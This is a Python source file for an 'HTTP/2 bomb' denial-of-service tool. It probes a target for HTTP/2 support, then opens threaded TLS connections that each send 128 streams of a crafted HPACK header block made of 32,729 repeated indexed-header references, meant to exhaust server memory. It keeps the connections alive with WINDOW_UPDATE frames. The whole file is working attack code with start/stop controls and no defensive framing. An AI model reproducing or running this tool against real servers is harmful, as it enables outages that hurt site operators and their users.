import socket
import ssl
import struct
import time
import threading
import logging

logger = logging.getLogger("http2-bomb")


def make_frame(frame_type, flags, stream_id, payload=b""):
    return struct.pack("!I", len(payload))[1:] + bytes([frame_type, flags]) + struct.pack("!I", stream_id) + payload


def window_update(stream_id):
    return make_frame(8, 0, stream_id, struct.pack("!I", 1))


BOMB_PAYLOAD = b"\x82\x84\x86\x41\x01x\x40\x01a\x00" + b"\xbe" * 32729


def check_http2(host, port=443, timeout=5.0):
    result = {"http2": False, "server": None, "error": None, "tls": False}
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])

        sock = ctx.wrap_socket(socket.socket(), server_hostname=host)
        sock.settimeout(timeout)
        sock.connect((host, port))

        result["tls"] = True
        negotiated = sock.selected_alpn_protocol()
        result["http2"] = (negotiated == "h2")
        result["alpn"] = negotiated

        try:
            sock.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            resp = sock.recv(4096).decode("utf-8", errors="ignore")
            for line in resp.split("\r\n"):
                if line.lower().startswith("server:"):
                    result["server"] = line.split(":", 1)[1].strip()
                    break
        except Exception:
            pass

        sock.close()
    except ssl.SSLError:
        try:
            sock = socket.socket()
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(
                b"GET / HTTP/1.1\r\nHost: " + host.encode() +
                b"\r\nUpgrade: h2c\r\nConnection: Upgrade, HTTP2-Settings\r\n\r\n"
            )
            resp = sock.recv(4096).decode("utf-8", errors="ignore")
            if "101" in resp and "h2c" in resp.lower():
                result["http2"] = True
                result["h2c"] = True
            sock.close()
        except Exception as e2:
            result["error"] = str(e2)
    except Exception as e:
        result["error"] = str(e)

    return result


class AttackTask:

    def __init__(self, host, port, connections=1, hold_seconds=10,
                 on_log=None, on_stats=None):
        self.host = host
        self.port = port
        self.connections = connections
        self.hold_seconds = hold_seconds
        self.on_log = on_log or (lambda msg: None)
        self.on_stats = on_stats or (lambda s: None)

        self._stop_event = threading.Event()
        self._threads = []
        self._stats = {
            "active": 0,
            "sent": 0,
            "errors": 0,
            "total_streams": connections * 128,
            "total_data_kb": connections * 128 * 32.7,
        }

    def _attack_worker(self, conn_id):
        if self._stop_event.is_set():
            return

        self._stats["active"] += 1
        self.on_stats(self._stats)

        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])

            sock = ctx.wrap_socket(socket.socket(), server_hostname=self.host)
            sock.settimeout(8)
            sock.connect((self.host, self.port))

            sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            sock.sendall(make_frame(4, 0, 0, struct.pack("!HI", 2, 0) + struct.pack("!HI", 4, 0)))

            time.sleep(0.3)

            try:
                while True:
                    if not sock.recv(65536):
                        break
            except Exception:
                pass

            sock.sendall(make_frame(4, 1, 0))

            for stream_idx in range(128):
                if self._stop_event.is_set():
                    break
                sid = 2 * stream_idx + 1
                payload = BOMB_PAYLOAD
                first = True

                while payload:
                    chunk = payload[:16384]
                    payload = payload[16384:]
                    eos = not payload
                    if first:
                        sock.sendall(make_frame(1, 0x1 | (0x4 if eos else 0), sid, chunk))
                        first = False
                    else:
                        sock.sendall(make_frame(9, 0x4 if eos else 0, sid, chunk))

            self._stats["sent"] += 1
            self.on_log(f"[Conn #{conn_id}] sent 128 streams")

            start = time.time()
            while time.time() - start < self.hold_seconds and not self._stop_event.is_set():
                try:
                    sock.sendall(window_update(0) + window_update(1))
                except Exception:
                    break
                time.sleep(1)

            sock.close()

        except Exception as e:
            self._stats["errors"] += 1
            self.on_log(f"[Conn #{conn_id}] error: {e}")

        finally:
            self._stats["active"] -= 1
            self.on_stats(self._stats)

    def start(self):
        self.on_log(f"Starting attack on {self.host}:{self.port}")
        self.on_log(f"  {self.connections} conns x 128 streams x 32729 refs")
        self.on_log(f"  Hold: {self.hold_seconds}s")

        self._threads = []
        for i in range(self.connections):
            t = threading.Thread(target=self._attack_worker, args=(i,), daemon=True)
            t.start()
            self._threads.append(t)

        def _waiter():
            for t in self._threads:
                t.join()
            self.on_log("Attack complete")
            self._stats["active"] = 0
            self.on_stats(self._stats)

        threading.Thread(target=_waiter, daemon=True).start()

    def stop(self):
        self.on_log("Stopping attack...")
        self._stop_event.set()
